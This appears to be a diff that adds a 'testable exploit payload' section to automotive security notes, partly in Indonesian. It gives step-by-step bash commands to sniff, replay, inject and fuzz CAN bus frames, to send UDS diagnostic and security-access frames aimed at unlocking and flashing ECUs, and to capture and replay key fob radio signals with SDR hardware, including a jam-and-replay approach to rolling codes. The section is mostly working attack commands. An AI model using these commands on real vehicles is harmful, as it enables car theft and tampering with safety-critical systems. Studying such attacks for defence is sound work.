@@ -123,3 +123,69 @@ Persistence: Custom firmware → persistent control
 - UDS (ISO 14229) — https://www.iso.org/standard/78879.html
 - Rolljam Research — https://samvartaka.github.io/...
 - CAN bus car hacking (Charlie Miller) — https://www.blackhat.com/us-15/...
+
+## Konkret — CAN Bus Exploit Payload (Testable)
+
+### CAN Bus Sniffing (ELM327 / can-utils)
+
+```bash
+# 1. Hardware: ELM327 OBD2 → USB, atau CAN-USB adapter
+# 2. Linux can-utils
+sudo modprobe can
+sudo ip link set can0 type can bitrate 500000
+sudo ip link set up can0
+
+# Sniff all CAN frames
+candump can0
+# Output: <iface> <id> <dlc> <data>
+#   can0 123#0102030405060708
+
+# Filter by ID
+candump can0,123:7ff
+```
+
+### CAN Bus Injection (Replay + Spoofing)
+
+```bash
+# 1. Capture specific frame (e.g., door unlock)
+candump -l can0    # log to file
+# 2. Replay: send logged frame
+canplayer -I candump-2024-01-01.log
+# 3. Direct injection (arbitrary frame)
+cansend can0 123#DEADBEEF
+# 4. Fuzzing (all IDs, random data)
+cansend can0 000#$(head -c 8 /dev/urandom | xxd -p)
+```
+
+### UDS (Unified Diagnostic Services, ISO 14229)
+
+```bash
+# UDS diagnostic session (0x10) → unlock ECU
+# 1. Send diagnostic session control (extended)
+cansend can0 7DF#0203140300000000
+# 2. Security access (0x27) → seed/key challenge
+# Request seed
+cansend can0 7DF#0227010000000000
+# Response: 0x27 0x01 <seed>
+# Calculate key (vendor algo) → send
+cansend can0 7DF#0427020304000000   # seed response
+# 3. Write data by identifier (0x2E) → flash firmware
+cansend can0 7DF#042E0101AA000000   # write identifier
+```
+
+### Remote Keyless (Rolling Code Replay)
+
+```bash
+# 1. SDR (HackRF / RTL-SDR) → capture key fob signal (433MHz)
+rtl_sdr -f 433920000 -s 250000 -g 40 - > capture.bin
+# 2. Analyse dengan inspectrum / Universal Radio Hacker
+# 3. Record + replay
+# HackRF: replay key fob signal
+hackrf_transfer -t key.bin -f 433920000 -s 2000000
+# Rolling code (Keeloq): harus capture + record + jam + replay
+# Timing must match window between capture and replay
+```
+---
+
+audited
+---
